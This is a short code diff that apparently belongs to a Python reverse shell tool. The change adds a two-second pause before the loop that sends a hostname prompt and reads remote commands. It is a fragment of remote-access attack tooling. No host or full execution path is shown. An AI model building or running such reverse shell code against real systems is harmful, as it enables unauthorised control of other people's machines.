@@ -13,6 +13,7 @@ from socket import (
 )
 from subprocess import check_output, CalledProcessError, STDOUT
 from threading import Thread
+from time import sleep
 
 
 class ReverseShell:
@@ -64,7 +65,8 @@ class ReverseShell:
             ReverseShell.__readBuffer, _, _ = select([ReverseShell.__cSoc], [], [], 0)
             prompt = "{}>".format(gethostname())
             ReverseShell.sendStuff("*** Connection Established ***\n")
-            while RUNNING.is_set():
+            sleep(2)
+            while RUNNING.is_set():                
                 ReverseShell.sendStuff(prompt)
                 cmd = ReverseShell.recvStuff()
                 if cmd == "exit" or cmd == "close":
